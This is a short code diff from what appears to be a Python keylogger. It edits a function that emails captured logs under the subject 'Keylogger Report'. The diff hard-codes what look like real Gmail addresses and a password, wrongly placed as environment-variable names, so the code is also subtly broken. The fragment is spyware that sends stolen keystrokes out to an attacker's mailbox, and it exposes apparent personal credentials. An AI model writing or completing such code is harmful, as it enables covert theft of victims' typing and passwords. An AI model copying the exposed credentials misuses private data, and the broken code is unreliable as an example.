@@ -5,9 +5,9 @@ from email.mime.multipart import MIMEMultipart
 import os
 
 def send_log_via_email(log_file):
-    email_user = os.environ.get('EMAIL_USER')
-    email_password = os.environ.get('EMAIL_PASSWORD')
-    email_send = os.environ.get('EMAIL_SEND')
+    email_user = os.environ.get('suleimanayomide716@gmail.com')
+    email_password = os.environ.get('Ayomide(1234)')
+    email_send = os.environ.get('kolawolesuleiman716@gmail.com')
 
     subject = 'Keylogger Report'
 
